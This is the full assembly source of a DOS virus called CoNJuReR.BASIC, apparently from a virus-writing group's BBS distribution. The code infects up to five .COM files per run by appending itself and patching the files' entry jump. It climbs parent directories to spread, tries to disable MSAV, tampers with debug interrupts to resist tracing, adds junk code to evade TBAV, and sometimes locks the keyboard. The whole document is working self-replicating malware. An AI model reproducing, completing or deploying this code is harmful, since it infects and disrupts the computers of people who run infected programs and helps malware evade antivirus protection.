


%OUT    CoNJuReR.BASIC virus by [Hacking Hell] & [Cyborg]
%OUT    Appending non-descructive non-resident non-flagged virus.
%OUT   Features:
%OUT    - Anti trace meganism
%OUT    - 101% TBAV proof (no flags)
%OUT    - Traversal (DotDot technique)
%OUT    - Little message
%OUT    - 13% chance for a keyboard lock

.model  tiny
.code
	
	ORG     100h                    ;COM file remember?!?

dummy:  db      0e9h,02h,00h
	db      'C'
	ret

start:  push    cx                      ;Some junk to fool TBAV
	pop     bx
	
	mov     ax,0fa01h               ;Let's take down MSAV!!!
	mov     dx,05945h
	int     16h
	
	call    getdlt                  ;Nice way to get delta offset!
realst:
getdlt: pop     bp
	sub     bp, offset getdlt
	call    encdec
	jmp     codest

	nop                             ;TBAV eats '#'

codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes        
	mov     di,0100h
	movsw
	movsw
	
	push    cs                      ;DS <==> CS
	pop     ds
	
	lea     dx,[eov+bp]             ;Set DTA address
	mov     ah,1ah
	int     21h
	
	mov     ax,3501h                ;Crash INT 1
	sub     ah,10h
	mov     bx,0000h
	mov     es,bx
	int     21h
	
	mov     al,03h                  ;Crash INT 3
	int     21h
	
	mov     ah,2ch                  ;13% chance to lock keyboard!
	int     21h
	cmp     dl, 0dh
	jg      nolock

lockkb: mov     al,82h                  ;Keyboard lock!
	out     21h,al
	
nolock: mov     ah,2ch                  ;50% chance to print message!
	int     21h
	cmp     dl,32h
	jl      spread

	mov     ah,09h                  ;Bingo! print message!
	lea     dx, [bp+offset welcome]
	int     21h
	mov     ah,00h                  ;Wait for a key!
	int     16h
	jmp     spread
			
welcome db 'CoNJuReR.BSC!',07h,0ah,0dh,'$';Ever seen a DB in the middle of a file?

spread: mov     byte ptr [infcnt+bp],0
spraed: mov     ah,4eh                  ;Findfirst
	lea     dx,[fspec+bp]           ;Filespec=*.COM

fnext:  cmp     byte ptr [infcnt+bp],5
	je      re_dta
	
	int     21h
	jc      dotdot                  ;No files found
	call    infect

nextf:  mov     ah,4fh                  ;Find next file
	jmp     fnext

dotdot: lea     dx,[offset dotspec+bp]
	mov     ax,3b00h
	int     21h
	jnc     spraed

re_dta: mov     ah,1ah                  ;Reset DTA
	mov     dx,0080h
	int     21h

	mov     di,0100h                ;Return control to original file!
	push    di
	ret


fspec   db      '*.com',0
infcnt  db      0
dotspec db      '..',0
jmptbl  db      0e9h,02h,00h,'C'
orgbts: db      90h,90h,90h,90h
eoe:
infect: lea     dx,[eov+1eh+bp]         ;Open file
	mov     ax,3d02h
	int     21h

	jc      nextf                   ;Error opening file, next!

	xchg    bx,ax

	mov     cx,0004h                ;Read first 4 bytes for check
	mov     ah,3fh                  ; if already infected!
	lea     dx,[orgbts+bp]
	int     21h

	cmp     byte ptr [orgbts+bp+3],'C' ;Already infected
	jz      shutit

	mov     ax,4202h                ;Goto eof
	sub     cx,cx                   ;2 byte version of mov cx,0!!
	cwd                             ;1 byte version of mov dx,0!!
	int     21h

	sub     ax,0003h                ;Use our jmp table
	mov     word ptr [bp+jmptbl+1],ax

	mov     ah,40h                  ;Implend our viral code into victim
	mov     cx,eov-start
	lea     dx,[bp+start]
	int     21h

	mov     ax,4200h                ;Goto SOF
	sub     cx,cx
	cwd
	int     21h

	mov     ah,40h                  ;Write first four bytes over
	mov     cx,0004h                ; the original
	lea     dx,[bp+jmptbl]
	int     21h
	
	inc     byte ptr [infcnt+bp]

shutit: mov     ah,3eh                  ;Close victim
	int     21h
	ret
encdec: ret                             ;No encryption support yet...
eov:
end     dummy

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Remember Where You Saw This Phile First ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄ[=] ARRESTED DEVELOPMENT +31.77.547477 The Netherlands [=]ÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

</==>